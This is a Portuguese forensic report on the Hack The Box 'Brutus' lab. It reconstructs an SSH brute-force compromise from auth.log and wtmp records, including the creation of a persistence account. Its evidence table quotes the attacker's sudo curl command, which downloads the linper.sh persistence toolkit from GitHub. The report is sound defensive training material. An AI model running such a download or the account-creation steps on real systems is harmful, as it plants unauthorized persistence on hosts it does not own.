## **Relatório de Análise Forense Digital: Investigação de Intrusão via SSH**  
LINK - https://app.hackthebox.com/sherlocks/Brutus?tab=play_sherlock  
*Desafio: Brutus (Hack The Box Sherlocks)*  

---

### **Contexto e Objetivo da Investigação**  
Este documento formaliza a metodologia de análise forense aplicada ao laboratório "Brutus", categorizado como um exercício introdutório de DFIR (Digital Forensics and Incident Response). O cenário simula o comprometimento de um servidor Confluence por meio de um ataque de força bruta contra o serviço SSH, seguido por atividades de pós-exploração, escalonamento de privilégios e estabelecimento de persistência.  

O objetivo central é demonstrar a capacidade de correlacionar artefatos de sistema operacional Linux (`auth.log` e `wtmp`) para reconstruir a linha do tempo do ataque com precisão cronológica, respondendo a requisitos investigativos específicos e mapeando as táticas do adversário ao framework MITRE ATT&CK. Esta documentação serve como evidência técnica para portfólio profissional, alinhando-se às competências de SOC Fundamentals e investigação digital.

---

### **Artefatos Disponíveis para Análise**  
- **`auth.log`**: Registro de autenticação do sistema Linux em texto plano. Contém tentativas de login, falhas, sucessos, aberturas de sessão e execuções de comandos com privilégios elevados (`sudo`).  
- **`wtmp`**: Arquivo binário que registra o histórico de sessões de login e logout (início e fim de TTY/PTS). Requer ferramentas específicas (como `utmpdump`, `last` ou scripts parsers como `utmp.py`) para extração legível.  

---

### **Metodologia de Investigação**  
A análise foi conduzida seguindo um fluxo estruturado de inteligência de logs, evitando suposições e baseando-se em evidências correlacionadas:  

- **Triagem Inicial**: Identificação de padrões anômalos, especificamente picos de volume elevado de falhas de autenticação provenientes de um único endereço IP externo.  
- **Correlação de Eventos**: Cruzamento de dados entre o `auth.log` (que registra o momento da autenticação bem-sucedida) e o `wtmp` (que confirma o início real da sessão interativa do terminal). Esta etapa é crítica para distinguir a validação automatizada de credenciais pelo ataque da ação manual subsequente do operador.  
- **Rastreamento de Ações**: Busca direcionada por comandos de administração de sistema, como criação de usuários (`useradd`), modificação de grupos (`usermod`) e execução privilegiada (`sudo`).  
- **Mapeamento Tático**: Classificação das ações do adversário utilizando o framework MITRE ATT&CK para padronização da linguagem de ameaças.  

---

### **Linha do Tempo do Ataque (Timeline)**  
O diagrama abaixo ilustra a sequência de eventos reconstruída a partir da correlação dos artefatos.  

<img width="4305" height="1917" alt="brutus-diag-1" src="https://github.com/user-attachments/assets/760501eb-4f7d-4737-90a5-1e7040c95268" />

---

### **Tabela de Evidências e Conclusões Investigativas**  
A tabela a seguir documenta como cada pergunta investigativa foi respondida, detalhando a fonte do artefato, a lógica de busca e a conclusão técnica.  

| Questão Investigativa | Fonte do Artefato | Lógica de Busca / Trecho do Log | Conclusão Técnica |
| :--- | :--- | :--- | :--- |
| **IP do atacante na força bruta** | `auth.log` | Filtragem por padrões de falha consecutiva (`Failed password`). | `65.2.161.68` |
| **Conta comprometida** | `auth.log` | Busca pela primeira ocorrência de sucesso (`Accepted password`) associada ao IP atacante. | `root` |
| **Timestamp do login manual (UTC)** | `wtmp` (processado) | Uso de `utmpdump` ou parser para isolar a sessão interativa real, distinta da autenticação automatizada inicial. | `2024-03-06 06:32:45` |
| **Número da sessão do atacante** | `auth.log` | Busca pelo evento de gerenciamento de sessão (`systemd-logind`) logo após o login manual. | `37` |
| **Conta criada para persistência** | `auth.log` | Busca por comandos de administração (`useradd`, `usermod`) executados via `sudo`. | `cyberjunkie` |
| **Técnica MITRE ATT&CK** | Framework MITRE | Mapeamento da ação "criação de conta local para manter acesso". | `T1136.001` (Create Account: Local Account) |
| **Duração da primeira sessão (segundos)** | `auth.log` / `wtmp` | Cálculo delta entre o início da sessão (`06:32:45`) e o evento de desconexão (`06:37:24`). | `279` segundos |
| **Comando privilegiado executado** | `auth.log` | Busca por registros de `sudo` associados ao usuário de persistência (`cyberjunkie`). | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

### **Esquema Resumido do Processo de Análise**  
Para demonstrar a reprodutibilidade do trabalho em ambientes de SOC ou investigações reais, o fluxo de trabalho aplicado pode ser visualizado no esquema abaixo.  

<img width="1703" height="2624" alt="brutus-diag-2" src="https://github.com/user-attachments/assets/6b480545-1b63-4292-bc59-e0dc599cff5c" />

---


Esta investigação destaca a importância de não confiar cegamente em um único artefato. A distinção entre o momento da autenticação bem-sucedida (ferramenta automatizada) e o início da sessão interativa real (ação humana) foi possível apenas pela correlação entre `auth.log` e `wtmp`.  

---  
*Documento gerado com foco em padrões profissionais de DFIR, sem dependência de formatações genéricas, priorizando clareza técnica e rastreabilidade das evidências.*  

